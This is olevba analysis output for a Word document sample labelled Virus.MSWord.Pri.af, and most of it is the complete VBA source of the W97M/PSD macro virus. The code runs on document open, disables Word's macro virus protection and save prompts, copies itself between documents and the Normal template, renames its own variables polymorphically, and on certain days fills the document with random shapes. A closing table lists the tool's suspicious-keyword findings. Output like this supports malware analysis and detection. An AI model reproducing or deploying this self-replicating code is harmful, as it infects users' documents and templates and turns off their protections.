olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.af-0dce79366b3b27c1b3bdc1f5b922791bb34fb6154c539e548bc2e341174f3832
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.af-0dce79366b3b27c1b3bdc1f5b922791bb34fb6154c539e548bc2e341174f3832 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
RN3032 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
TG046 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set VA1159 = ActiveDocument.VBProject.VBComponents.Item(1)
UA4055 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set VA1159 = NormalTemplate.VBProject.VBComponents.Item(1)
PP8711 = True
Call TU497_QM7396
ActiveDocument.Saved = True
End If
If PP8711 <> True And UA4055 <> True Then GoTo UP9127
If PP8711 = True Then VA1159.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RN3032 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If UA4055 = True Then VA1159.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TG046 - 3))
UP9127:
If TG046 <> 0 And RN3032 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function TU497_QM7396()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "VT8350": r1(2) = "QD750": r1(3) = "OH4515": r1(4) = "QS052": r1(5) = "QM7396": r1(6) = "RN3032"
r1(7) = "TG046": r1(8) = "UA4055":: r1(9) = "VA1159": r1(10) = "PP8711": r1(11) = "UP9127": r1(12) = "TU497": r1(13) = "AV7888": r1(14) = "TU8621"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call QM7396(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function QM7396(TU8621, AV7888 As String)
On Error Resume Next
Dim VT8350 As Long: Dim QD750 As Long: Dim OH4515 As Long: Dim QS052 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
VT8350 = 1: QD750 = 1: OH4515 = .CountOfLines: QS052 = Len(.Lines(.CountOfLines, 1))
Do While .Find(AV7888, VT8350, QD750, OH4515, QS052, True)
strline = .Lines(VT8350, 1)
strline = Left(strline, QD750 - 1) & TU8621 & Mid(strline, QS052)
.replaceline VT8350, strline
VT8350 = OH4515 + 1: QD750 = 1:
OH4515 = .CountOfLines
QS052 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

